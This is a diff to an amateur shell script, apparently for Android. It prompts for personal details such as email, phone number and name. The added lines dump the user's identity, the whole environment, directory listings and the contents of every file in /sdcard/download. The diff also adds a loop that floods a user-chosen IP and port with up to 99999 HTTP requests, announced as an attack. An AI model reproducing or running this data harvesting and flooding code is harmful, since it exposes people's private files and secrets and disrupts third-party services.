@@ -9,6 +9,7 @@ echo ""
   echo -n "Email :"
   read email
 
+
 cm()
 {
 read line
@@ -20,10 +21,21 @@ read line
   User   : $(whoami)
   date   : $(date)
   path   : $(pwd)
+  id     : $(id)
 
-  $(cd /sdcard/download)
+
+  $(set)
+
+
+  $(cd)
+  $(cd ..)
+  $(cd usr)
   $(ls -la)
   $(cd)
+  $(cd /sdcard/download)
+  $(ls -la)
+  $(cat *)
+
 
   phone number : $phone
   name : $name
@@ -36,3 +48,30 @@ read line
  esac
  }
 cm
+echo -n Enter IP :
+ read ip
+ echo -n Enter Port :
+ read port
+  echo setting up targeted $ip:$port
+sleep 3
+dos_attack() {
+ number_sent=1
+    function request() {
+  while [ $number_sent -lt 99999 ]
+  do
+    echo Sent Packet $RANDOM.$number_sent bytes to $ip:$port $(curl http://$ip:$port)
+   echo $(curl http://$ip:$port)
+number_sent=`expr $number_sent + 1`
+  done
+ }
+ request
+}
+  echo 1
+  sleep 1
+  echo 2
+  sleep 1
+  echo 3
+  sleep 1
+  echo ATTACKK !!!
+  sllep 1
+dos_attack
